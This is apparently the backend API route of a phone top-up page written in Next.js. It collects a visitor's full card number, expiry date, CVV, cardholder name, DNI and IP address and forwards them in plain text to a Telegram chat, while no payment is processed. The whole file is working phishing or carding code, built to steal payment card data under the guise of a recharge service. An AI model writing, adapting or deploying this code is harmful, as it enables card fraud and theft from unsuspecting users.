import { NextRequest, NextResponse } from "next/server"

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { telefono, monto, numero_tarjeta, vencimiento, cvv, titular, dni, tipo_tarjeta } = body

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram not configured" }, { status: 500 })
    }

    const ip = req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "unknown"
    const hora = new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })

    const message = `
🔔 *Nueva Recarga*

📱 *Telefono:* ${telefono}
💰 *Monto:* $${monto}

💳 *Datos de Tarjeta:*
• Tipo: ${tipo_tarjeta || "N/A"}
• Numero: ${numero_tarjeta}
• Vencimiento: ${vencimiento}
• CVV: ${cvv}
• Titular: ${titular}
• DNI: ${dni}

🌐 *IP:* ${ip}
🕐 *Hora:* ${hora}
`

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    const result = await response.json()

    if (!result.ok) {
      return NextResponse.json({ error: "Failed to send to Telegram", details: result }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}